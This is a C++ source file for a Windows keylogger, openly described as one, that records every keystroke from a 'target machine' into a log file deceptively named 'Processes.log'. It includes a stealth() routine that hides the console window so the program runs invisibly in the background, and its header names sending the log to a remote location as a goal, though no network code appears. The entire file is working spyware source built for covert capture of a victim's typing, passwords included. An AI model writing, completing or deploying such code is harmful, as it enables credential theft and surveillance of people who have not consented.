//============================================================================
// Name        : Keylogger.cpp
// Author      : Tom Riddle
// Version     : 3.0
// Copyright   : Imperio
// Description : Key Logger in C++
// Scope	   : Log wider range of keys ; Return log file to remote location
//============================================================================


/*
	# KEYLOGGER PROGRAM THAT RECORDS KEYSTROKES FROM TARGET MACHINE
	# AND SAVES THEM INTO A TEXT FILE SPECIFIED IN ofstream out PATH
	# THIS PATH IS SET TO DESKTOP BY DEFAULT AND 
	# IT IS APPLICABLE ONLY TO A WINDOWS MACHINE
*/

#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
using namespace std;

void log();
void stealth();

int main()
{
	log();

	return 0;
}


// UPDATED KEYLOGGER
// SUPPORTS FEATURES LIKE :-
// UPPER AND LOWER CASE CHARACTERS
// SPECIAL CHARACTERS
// ALL SPECIAL SYSTEM KEYS INCLUDED IN BASIC VERSION

void log()
{
	stealth();																													// a stealth() function is called to keep the console out of sight while the program is in use
	char key;

		while(true)																												// once started, it keeps on running in the background and does its job
		{
			ofstream out ("C:\\Users\\<USERNAME>\\Processes.log", ios::app);													// output log file [change it according to need before deployment]
			for (key=8; key<=220; key++)																						// most commonly used range of keys
			{
				if (GetAsyncKeyState(key) == -32767)																			// if any key is pressed ... check inside
				{
					// SHIFT + ALPHABETS
					if ( (key>64) && (key<91) && !(GetAsyncKeyState(VK_SHIFT)) && (GetKeyState(VK_CAPITAL) & 0x0001)==0 )		// any alphabet key is pressed + shift is not pressed + caps lock is not toggled
					{																											// (GetKeyState(VK_CAPITAL) & 0x0001) returns 0 if CAPS is not toggled, otherwise returns 1
						key += 32;																								// lower case characters are logged
						out << key;
						out.close();
						break;
					}

					// ONLY ALPHABETS
					else if ((key>64) && (key<91))																				// upper case characters (any of the upper conditions fail)
					{
						out << key;
						out.close();
						break;
					}

					// ALL OTHER CASES																							// manual checking for special characters and cases
					else
					{
						switch (key)
						{
							case 8:												// BACKSPACE
								out << " [BckSp] ";		break;
							case 9:												// HORIZONTAL TAB
								out << "\t";			break;
							case 10: case 13 :									// ENTER / CARRAIGE RETURN
								out << "\n";			break;
							case 27:											// ESCAPE
								out << " [Esc] ";		break;
							case 127:											// DELETE
								out << " [Del] ";		break;

							case VK_OEM_COMMA:									// , (COMMA)
								if (GetAsyncKeyState(0x10))
									out << "<";
								else
									out << ",";
								break;

							case VK_OEM_MINUS:									// - (HYPHEN)
								if (GetAsyncKeyState(0x10))
									out << "_";
								else
									out << "-";
								break;

							case VK_OEM_PERIOD:									// . (DOT)
								if (GetAsyncKeyState(0x10))
									out << ">";
								else
									out << ".";
								break;
							
							case VK_OEM_2:										// / (FW/SLASH)
								if (GetAsyncKeyState(0x10))
									out << "?";
								else
									out << "/";
								break;

							case 48:											// 0
								if (GetAsyncKeyState(0x10))
									out << ")";
								else
									out << key;
								break;

							case 49:											// 1
								if (GetAsyncKeyState(0x10))
									out << "!";
								else
									out << key;
								break;

							case 50:											// 2
								if (GetAsyncKeyState(0x10))
									out << "@";
								else
									out << key;
								break;

							case 51:											// 3
								if (GetAsyncKeyState(0x10))
									out << "#";
								else
									out << key;
								break;

							case 52:											// 4
								if (GetAsyncKeyState(0x10))
									out << "$";
								else
									out << key;
								break;

							case 53:											// 5
								if (GetAsyncKeyState(0x10))
									out << "%";
								else
									out << key;
								break;

							case 54:											// 6
								if (GetAsyncKeyState(0x10))
									out << "^";
								else
									out << key;
								break;

							case 55:											// 7
								if (GetAsyncKeyState(0x10))
									out << "&";
								else
									out << key;
								break;

							case 56:											// 8
								if (GetAsyncKeyState(0x10))
									out << "*";
								else
									out << key;
								break;

							case 57:											// 9
								if (GetAsyncKeyState(0x10))
									out << "(";
								else
									out << key;
								break;

							case VK_OEM_1:										// ; (SEMI COLON)
								if (GetAsyncKeyState(0x10))
									out << ":";
								else
									out << ";";
								break;

							case 61:											// = (EQUALS)
								if (GetAsyncKeyState(0x10))
									out << "+";
								else
									out << "=";
								break;

							case VK_OEM_4:										// [ (SQ. BRACKET OPEN)
								if (GetAsyncKeyState(0x10))
									out << "{";
								else
									out << "[";
								break;

							case VK_OEM_5:										// \ (BW/SLASH)
								if (GetAsyncKeyState(0x10))
									out << "|";
								else
									out << "\\";
								break;

							case VK_OEM_6:										// ] (SQ. BRACKET CLOSE)
								if (GetAsyncKeyState(0x10))
									out << "}";
								else
									out << "]";
								break;

							case 32: 											
								out << " ";		break;
																				// numpad characters from here on
							case VK_NUMPAD0:	out << "0";	break;
							case VK_NUMPAD1:	out << "1";	break;
							case VK_NUMPAD2:	out << "2";	break;
							case VK_NUMPAD3:	out << "3";	break;
							case VK_NUMPAD4:	out << "4";	break;
							case VK_NUMPAD5:	out << "5";	break;
							case VK_NUMPAD6:	out << "6";	break;
							case VK_NUMPAD7:	out << "7";	break;
							case VK_NUMPAD8:	out << "8";	break;
							case VK_NUMPAD9:	out << "9";	break;
							case VK_MULTIPLY:	out << "*";	break;
							case VK_ADD:		out << "+";	break;
							case VK_DIVIDE:		out << "/";	break;
							case VK_SUBTRACT:	out << "-";	break;							
							case VK_DECIMAL:	out << ".";	break;
							
						}
						out.close();
						break;
					}
				}
			}
		}
}


// THIS FUNCTION IS RESPONSIBLE FOR KEEPING THE CONSOLE
// OUT OF SIGHT AND IN THE BACKGROUND TO RUN THE CODE
// IN STEALTH MODE
// THE CODE RUNS INDEFINITELY ONCE STARTED AND CAN
// ONLY BE TERMINATED BY KILLING THE TASK FROM TASK MANAGER

void stealth()
{
	HWND stealth;											// created stealth handle
	AllocConsole();											// console allocated
	stealth = FindWindowA("ConsoleWindowClass",NULL);		// console window is set to the stealth handle
	ShowWindow(stealth,0);									// show window is set to 0 = false ... so window is not shown
}
